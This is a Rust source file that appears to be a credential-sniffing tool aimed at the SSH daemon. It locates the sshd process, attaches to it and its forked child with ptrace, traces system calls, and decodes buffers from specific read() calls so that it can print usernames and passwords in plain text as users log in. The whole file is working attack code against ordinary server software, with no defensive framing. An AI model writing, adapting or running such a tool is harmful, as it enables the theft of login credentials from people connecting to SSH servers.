#![allow(non_snake_case)]


pub fn getPID() -> sysinfo::Pid {
  
    // Create sysinfo object and refresh to collect current os state
    let mut sys = sysinfo::System::new_all();
    sys.refresh_all();

    // Getting the SSHD process
    let sshd = sys.processes_by_name("sshd").take(1).next().unwrap();

    // SSHD PID
    sshd.pid()

}



pub fn checkTHREAD(pid: sysinfo::Pid) -> nix::unistd::Pid {

    // Changing sysinfo::Pid as i32 passed over nix::unistd::Pid
    let pid = nix::unistd::Pid::from_raw(pid.as_u32() as i32);

    // Attaching to SSHD
    nix::sys::ptrace::attach(pid).unwrap();

    // Wait for SIGTRAP signal
    nix::sys::wait::waitpid(pid, None).unwrap();

    // Tracing all options 
    nix::sys::ptrace::setoptions(pid, nix::sys::ptrace::Options::all()).unwrap();

    // Continuing process
    nix::sys::ptrace::cont(pid, None).unwrap();

    // Wait for SIGTRAP signal
    nix::sys::wait::waitpid(pid, None).unwrap();

    // Getting child PID as i32
    let child_pid = nix::sys::ptrace::getevent(pid).unwrap() as i32;

    // Changing child i32 as nix::unistd::PID
    let child_pid = nix::unistd::Pid::from_raw(child_pid);

    // Detach with no signal or die
    nix::sys::ptrace::detach(child_pid, None).unwrap();
    nix::sys::ptrace::detach(pid, None).unwrap();

    // Child PID
    child_pid

}



pub fn debugTHREAD(pid: nix::unistd::Pid) {
    
    // Attaching to child
    nix::sys::ptrace::attach(pid).unwrap();

    // Wait for SIGTRAP signal
    nix::sys::wait::waitpid(pid, None).unwrap();

    // Counter to print Username and Password
    let mut count = 0;

    loop {
            
        // Invokes syscall
        nix::sys::ptrace::syscall(pid, None).unwrap();

        // Wait for SIGTRAP signal
        let _wait = nix::sys::wait::waitpid(pid, None).unwrap();

        match _wait {
            nix::sys::wait::WaitStatus::Exited(pid, status) => {
                                                                    println!("Child {pid} exited with status {status}");
                                                                    std::process::exit(1);
                                                                },
            _ => {
                    // Gettiing registers
                    let reg = nix::sys::ptrace::getregs(pid).unwrap();

                    // Checking for Username and Password
                    if (0..2).contains(&count) && sysnames::Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..20).contains(&(reg.rdx as u16)) {
                        count += 1;
                        
                        if !decoder(pid, reg.rsi as nix::sys::ptrace::AddressType).is_empty() {
                            println!("\n\n{} Username: {} Captured at: {:?}\n\n", "\t".repeat(5), decoder(pid, reg.rsi as nix::sys::ptrace::AddressType), reg.rsi as nix::sys::ptrace::AddressType);
                        }

                    } else if (2..5).contains(&count) && sysnames::Syscalls::name(reg.orig_rax as u64).unwrap() == "read" && reg.rdi as u16 == 6 && (6..20).contains(&(reg.rdx as u16)) {
                        
                        if !decoder(pid, reg.rsi as nix::sys::ptrace::AddressType).is_empty() {
                            println!("{} Password:{} Captured at: {:?}", "\t".repeat(5), decoder(pid, reg.rsi as nix::sys::ptrace::AddressType), reg.rsi as nix::sys::ptrace::AddressType);
                        }

                    }
                }
        }
    }
}



pub fn decoder(pid: nix::unistd::Pid, addr: nix::sys::ptrace::AddressType) -> String {
    
    // Reading RSI
    let address = format!("{:?}", nix::sys::ptrace::read(pid, addr).unwrap() as nix::sys::ptrace::AddressType);

    // Retrieving Username || Password
    let mut string = String::new();

    // Storing the splited data
    let mut data = String::new();

    for i in address.trim().split("0x").last().unwrap().chars() {
        
        data.push(i);

        if data.len() == 2 {
        
            // Hex to String
            let hex_value = u32::from_str_radix(data.clone().as_str(), 16).unwrap();

            // Integer to char
            let character = char::from_u32(hex_value).unwrap();

            string.push(character.clone());
            data = String::new();
        }
    }

    // Reversing string
    string.trim().chars().rev().collect()

}
